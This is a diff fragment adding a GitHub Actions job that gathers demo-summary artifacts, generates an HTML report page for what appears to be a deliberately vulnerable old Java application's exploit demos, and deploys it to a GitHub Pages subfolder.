+    concurrency:
+      group: "gh-pages-deploy-vulnerable"
+      cancel-in-progress: false
+
+    steps:
+      - uses: actions/checkout@v7
+
+      - name: "⬇️ Download all demo summaries"
+        uses: actions/download-artifact@v4
+        with:
+          pattern: "demo-summary-*"
+          path: /tmp/summaries
+          merge-multiple: true
+
+      - name: "🐍 Install markdown renderer"
+        run: pip install markdown -q
+
+      - name: "🏗️ Generate the /vulnerable report page"
+        run: |
+          python3 "Vulnerable Application Old Java/scripts/generate-vulnerable-report.py" \
+            /tmp/summaries \
+            "Vulnerable Application Old Java/target/vulnerable/index.html" \
+            --title "Vulnerable App — Live Exploit Demos" \
+            --run-url "${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}"
+
+      - name: "📁 Prepare Pages directory"
+        run: |
+          mkdir -p tmp/pages
+          cp "Vulnerable Application Old Java/target/vulnerable/index.html" tmp/pages/
+
+      # Published as its own subfolder, same pattern as compare-scans.yml's Scans/ deploy
+      # — see that workflow for why peaceiris + destination_dir is used instead of
+      # actions/deploy-pages here.
+      - name: "🚀 Deploy to GitHub Pages (vulnerable/ subfolder)"
+        uses: Wandalen/wretry.action@v3
+        with:
+          action: peaceiris/actions-gh-pages@v4
+          attempt_limit: 3
+          attempt_delay: 5000
+          with: |
+            github_token: ${{ secrets.GITHUB_TOKEN }}
+            publish_dir: tmp/pages
+            destination_dir: vulnerable
+            keep_files: true
+
+      # Now the report is available under https://johanjanssen.github.io/Keep-Up-To-Date/vulnerable/
